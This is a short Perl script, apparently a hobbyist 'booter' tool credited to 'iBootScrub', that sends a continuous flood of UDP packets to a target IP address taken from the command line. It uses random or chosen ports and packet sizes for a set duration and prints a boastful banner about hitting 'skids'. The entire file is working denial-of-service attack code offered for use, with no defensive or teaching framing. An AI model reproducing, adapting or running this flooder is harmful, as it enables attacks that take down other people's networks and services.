#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

##
# VapeDaddy 
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD RED<<EOTEXT;
 ▄█    █▄     ▄████████    ▄███████▄    ▄████████ 
███    ███   ███    ███   ███    ███   ███    ███ 
███    ███   ███    ███   ███    ███   ███    █▀  
███    ███   ███    ███   ███    ███  ▄███▄▄▄     
███    ███ ▀███████████ ▀█████████▀  ▀▀███▀▀▀     
███    ███   ███    ███   ███          ███    █▄  
███    ███   ███    ███   ███          ███    ███ 
 ▀██████▀    ███    █▀   ▄████▀        ██████████ 
                                                  
		Made By iBootScrub
EOTEXT

print "Eating Doritos While Slammin Skids $ip " . ($port ? $port : "random") . " port with " . 
  ($size ? "$size-byte" : "random size") . " packets" . 
  ($time ? " for $time seconds" : "") . "\n";
print "Stop Eating Doritos with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}